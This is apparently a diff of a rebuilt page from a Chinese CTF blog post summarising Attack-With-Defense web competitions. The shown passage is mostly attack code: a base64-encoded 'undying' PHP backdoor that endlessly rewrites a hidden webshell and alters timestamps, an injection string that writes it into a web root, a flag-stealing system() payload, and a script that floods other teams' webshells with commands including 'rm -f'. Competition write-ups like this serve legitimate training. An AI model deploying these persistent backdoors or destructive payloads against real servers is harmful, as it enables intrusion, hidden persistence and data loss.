     &#125;//while循环中每隔usleep(0)即写新的后门文件，system命令用于修改文件的创建时间或修改时间，因为在AWD比赛中有的队伍使用
 ?&gt;
-</code></pre><pre><code class="language-python">import time
+</code></pre><pre><code class="python">import time
 
 import requests
 import json
@@ -383,7 +383,7 @@ with open(&quot;url.txt&quot;, &quot;r&quot;) as f:
 
 
 nodie = &quot;PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=&quot;
-poc = &quot;fputs(fopen('/var/www/html/nodie.php','w'),base64_decode('PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo='));&quot;
+poc = &quot;fputs(fopen(&#39;/var/www/html/nodie.php&#39;,&#39;w&#39;),base64_decode(&#39;PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=&#39;));&quot;
 
 header2=&#123;&quot;token&quot;:&quot;&quot;,
          &quot;Cookie&quot;:&quot;&quot;&#125;
@@ -391,7 +391,7 @@ header2=&#123;&quot;token&quot;:&quot;&quot;,
 url4=&quot;&quot;
 
 payload2=&#123;&quot;flag&quot;:&quot;&quot;&#125;
-payload3=&#123;&quot;xcu&quot;:&quot;system('cat /flag.txt');&quot;&#125;
+payload3=&#123;&quot;xcu&quot;:&quot;system(&#39;cat /flag.txt&#39;);&quot;&#125;
 while True:
     for i in data:
         #执行命令
@@ -422,15 +422,15 @@ while True:
 
 4 #显示最近登录的5个帐号
 
-5 last -n 5|awk '&#123;print $1&#125;'
+5 last -n 5|awk &#39;&#123;print $1&#125;&#39;
 
 6 #显示/etc/passwd的账户
 
-7 cat /etc/passwd|awk -F ':' '&#123;print $1&#125;'
+7 cat /etc/passwd|awk -F &#39;:&#39; &#39;&#123;print $1&#125;&#39;
 
 8 #查看UID为0的帐号
 
-9 awk -F: '&#123;if($3==0)print $1&#125;' /etc/passwd10 #查找777的权限的文件
+9 awk -F: &#39;&#123;if($3==0)print $1&#125;&#39; /etc/passwd10 #查找777的权限的文件
 
 11 find . -name &quot;*.php&quot; -perm 4777
 
@@ -495,30 +495,29 @@ while True:
 41 #查看页面访问排名前十的URL
 
 42 cat /var/log/apache2/access.log|cut -f4 -d|sort|uniq -c|sort -k -r|head -
-</code></pre><h2 id="最后"><a class="anchor" href="#最后">#</a> 最后</h2><p>是要做一名合格的搅屎棍</p><p>恶心别人，核心就是发送大量垃圾数据包给别人 ，让别人无法正常观察流量捕捉 payload ，此招就是干扰对手利用他人的 payload 给对手造成干扰。但是有些比赛可能也会禁止。</p><p>我们拿到 shell 后在规则允许的情况我们可以删除别人的文件，别人 check 丢分也相当于自己加分。</p><pre><code class="language-python">import requests
+</code></pre><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>是要做一名合格的搅屎棍</p><p>恶心别人，核心就是发送大量垃圾数据包给别人 ，让别人无法正常观察流量捕捉payload ，此招就是干扰对手利用他人的payload 给对手造成干扰。但是有些比赛可能也会禁止。</p><p>我们拿到shell后在规则允许的情况我们可以删除别人的文件，别人check丢分也相当于自己加分。</p><pre><code class="python">import requests
 import time
 
 def scan_attack():
-    file=&#123;'shell.php','x.php','index.php','web.php','1.php'&#125;
-    payload=&#123;'cat /flag','ls -al','rm -f','echo 1'&#125;
+    file=&#123;&#39;shell.php&#39;,&#39;x.php&#39;,&#39;index.php&#39;,&#39;web.php&#39;,&#39;1.php&#39;&#125;
+    payload=&#123;&#39;cat /flag&#39;,&#39;ls -al&#39;,&#39;rm -f&#39;,&#39;echo 1&#39;&#125;
     while(1):
         for i in range(8802, 8804):
             for ii in file:
-                url='http://192.168.76.156:'+ str(i)+'/'+ii
+                url=&#39;http://192.168.76.156:&#39;+ str(i)+&#39;/&#39;+ii
                 for iii in payload:
                     data=&#123;
-                        'payload':iii
+                        &#39;payload&#39;:iii
                     &#125;
                     try:
                         requests.post(url,data=data)
-                        print(&quot;正在搅屎:&quot;+str(i)+'|'+ii+'|'+iii)
+                        print(&quot;正在搅屎:&quot;+str(i)+&#39;|&#39;+ii+&#39;|&#39;+iii)
                         time.sleep(0.5)
                     except Exception as e:
                         time.sleep(0.5)
                         pass
 
 
-if __name__ == '__main__':
+if __name__ == &#39;__main__&#39;:
     scan_attack()
-
-</code></pre><p>最后的最后，准备 - 漏洞资源 - 漏洞资料库（比赛能不能联网无法确定，如刚结束的河南省赛，虽然允许联网，但是大部分博客平台被加入了黑名单）</p><div class="tags"><a href="/tags/Awd-web/" rel="tag"><i class="ic i-tag"></i> Awd-web</a></div></div><footer><div class="meta"><span id="2022/10/24/awd-web小结/" class="item leancloud_visitors" data-flag-title="Awd-web小结" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/" title="Awd-web小结">https://blog.xcu.icu/2022/10/24/awd-web小结/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;23.jpg" title="nat模式+ip分配"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 网络服务应用</span><h3>nat模式+ip分配</h3></a></div><div class="item right"><a href="/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;147.jpg" title="CTFshow-web入门信息收集"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> CTFshow</span><h3>CTFshow-web入门信息收集</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%AF%94%E8%B5%9B%E4%BF%A1%E6%81%AF-%E8%A7%84%E5%88%99"><span class="toc-number">1.</span> <span class="toc-text">查看比赛信息、规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">改密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="toc-number">3.</span> <span class="toc-text">下载源码，备份</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">利用漏洞攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">6.</span> <span class="toc-text">最后</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/" rel="bookmark" title="基于sqli-labs进阶学习">基于sqli-labs进阶学习</a></li><li><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esqli-labs%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="bookmark" title="基于sqli-labs前20关的SQL注入学习">基于sqli-labs前20关的SQL注入学习</a></li><li class="active"><a href="/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/" rel="bookmark" title="Awd-web小结">Awd-web小结</a></li><li><a href="/2022/10/24/sql%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL注入">SQL注入</a></li><li><a href="/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/" rel="bookmark" title="user.ini和htaccess文件的利用">user.ini和htaccess文件的利用</a></li><li><a href="/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="文件上传小结">文件上传小结</a></li><li><a href="/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" rel="bookmark" title="XSS跨站脚本攻击">XSS跨站脚本攻击</a></li><li><a href="/2022/10/31/CSRF&SSRF/" rel="bookmark" title="CSRF&SSRF">CSRF&SSRF</a></li><li><a href="/2022/11/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/" rel="bookmark" title="php反序列化">php反序列化</a></li><li><a href="/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/" rel="bookmark" title="php://filter过exit">php://filter过exit</a></li><li><a href="/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/" rel="bookmark" title="preg_match&&正则">preg_match&&正则</a></li><li><a href="/2023/03/01/nosql/" rel="bookmark" title="nosql学习笔记">nosql学习笔记</a></li><li><a href="/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="主动信息收集">主动信息收集</a></li><li><a href="/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="被动信息收集">被动信息收集</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">54</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">39</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="分类于 数据库">数据库</a></div><span><a href="/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/" title="关系数据库">关系数据库</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a></div><span><a href="/2022/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/" title="数据结构与算法入门">数据结构与算法入门</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/" title="Awd-web小结">Awd-web小结</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="主动信息收集">主动信息收集</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传小结">文件上传小结</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/07/14/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="JavaScript原型链污染">JavaScript原型链污染</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91/" title="分类于 内网">内网</a></div><span><a href="/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/" title="域环境基础和搭建">域环境基础和搭建</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/05/16/CommonsCollections-1/" title="ConmonsCollection-1">ConmonsCollection-1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/" title="preg_match&amp;&amp;正则">preg_match&&正则</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/02/15/php%E7%89%B9%E6%80%A7/" title="CTFshow-web入门php特性">CTFshow-web入门php特性</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">566k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">8:34</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/10/24/awd-web小结/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->
+</code></pre><p>最后的最后，准备-漏洞资源-漏洞资料库（比赛能不能联网无法确定，如刚结束的河南省赛，虽然允许联网，但是大部分博客平台被加入了黑名单）</p><div class="tags"><a href="/tags/Awd-web/" rel="tag"><i class="ic i-tag"></i> Awd-web</a></div></div><footer><div class="meta"><span id="2022/10/24/awd-web小结/" class="item leancloud_visitors" data-flag-title="Awd-web小结" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/" title="Awd-web小结">https://blog.xcu.icu/2022/10/24/awd-web小结/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;38.jpg" title="nat模式+ip分配"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 网络服务应用</span><h3>nat模式+ip分配</h3></a></div><div class="item right"><a href="/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;151.jpg" title="CTFshow-web入门信息收集"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> CTFshow</span><h3>CTFshow-web入门信息收集</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%AF%94%E8%B5%9B%E4%BF%A1%E6%81%AF%E3%80%81%E8%A7%84%E5%88%99"><span class="toc-number">1.</span> <span class="toc-text">查看比赛信息、规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">改密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%EF%BC%8C%E5%A4%87%E4%BB%BD"><span class="toc-number">3.</span> <span class="toc-text">下载源码，备份</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">利用漏洞攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">6.</span> <span class="toc-text">最后</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/" rel="bookmark" title="基于sqli-labs进阶学习">基于sqli-labs进阶学习</a></li><li><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esqli-labs%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="bookmark" title="基于sqli-labs前20关的SQL注入学习">基于sqli-labs前20关的SQL注入学习</a></li><li class="active"><a href="/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/" rel="bookmark" title="Awd-web小结">Awd-web小结</a></li><li><a href="/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/" rel="bookmark" title="user.ini和htaccess文件的利用">user.ini和htaccess文件的利用</a></li><li><a href="/2022/10/24/sql%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL注入">SQL注入</a></li><li><a href="/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="文件上传小结">文件上传小结</a></li><li><a href="/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" rel="bookmark" title="XSS跨站脚本攻击">XSS跨站脚本攻击</a></li><li><a href="/2022/10/31/CSRF&SSRF/" rel="bookmark" title="CSRF&SSRF">CSRF&SSRF</a></li><li><a 